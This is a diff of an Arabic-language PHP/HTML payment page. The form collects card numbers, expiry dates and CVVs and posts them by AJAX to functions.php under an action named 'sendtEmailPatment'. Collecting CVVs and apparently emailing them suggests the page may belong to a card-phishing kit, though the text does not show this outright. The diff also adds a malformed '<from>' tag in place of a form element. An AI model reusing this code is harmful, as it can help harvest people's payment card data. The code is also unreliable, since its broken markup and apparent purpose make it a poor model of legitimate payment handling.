@@ -50,8 +50,8 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
             </div>
         </div>
     </section>
-    <div action="functions.php" method="post" id="payment-form">
-        <input type="hidden" name="action" value="sendtEmailPatment">
+    <from  id="payment-form">
+        <input type="hidden" name="action" id="action" value="sendtEmailPatment">
 
         <section>
             <div class="container">
@@ -80,7 +80,7 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <input type="text" class="form-control" name="cardNumber"  id="cardNumber" placeholder="رقم بطاقة الصراف الألي">
                                 </div>
                                 <div class="col-4">
-                                    <select class="form-select"  name="bada" aria-label="Select an option">
+                                    <select class="form-select"  name="bada" id="bada" aria-label="Select an option">
                                         <option value="" disabled selected hidden>بادئة</option> <!-- Placeholder option -->
                                         <option value="1">Option 1</option>
                                         <option value="2">Option 2</option>
@@ -159,7 +159,7 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                 </div>
             </div>
         </section>
-</div>
+</from>
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
@@ -171,63 +171,57 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
         e.preventDefault();
         var isValid = true;
         var contry = $('#contry').val();
-
-
         // Simple validation
         var name = $('#cardNumber').val();
         // var email = $('#email').val();
-  
-
        var month = $('#month').val();
-
-    
        var year = $('#year').val();
        var cvv = $('#cvv').val();
+       var action = $('#action').val();
+       var bada = $('#bada').val();
     
        if (contry === "" || contry === null) {
           alert("الرجاء ادخال الدولة.");
           isValid = false;
           return "";
         }
-
-      
         // Check if name is filled
         if (name === "" || name === null) {
           alert("الرجاء ادخال الاسم.");
           isValid = false;
           return "";
         }
-
-    
-
-
         if (month === "" || month === null) {
           alert("الرجاء ادخال الشهر.");
           isValid = false;
           return "";
         }
-
         if (year === "" || year === null) {
           alert("الرجاء ادخال السنة.");
           isValid = false;
           return "";
         }
-
         if (cvv === ""  || cvv === null) {
           alert("الرجاء ادخال الرقم السري.");
           isValid = false;
           return "";
         }
-
+    
         // Submit form if valid
         if (isValid) {
-            let formData = $(this).serialize();
-
-            console.log(formData);
+    
             $.ajax({
                 url: '/functions.php',
                 type: 'POST',
-                data: formData,
+                data: {
+                    action: action,
+                    contry: contry,
+                    name: name,
+                    month: month,
+                    year: year,
+                    cvv: cvv,
+                    bada: bada
+                },
                 dataType: 'json', // Expect JSON response
                 success: function(response) {
                     if (response.status === 'success') {
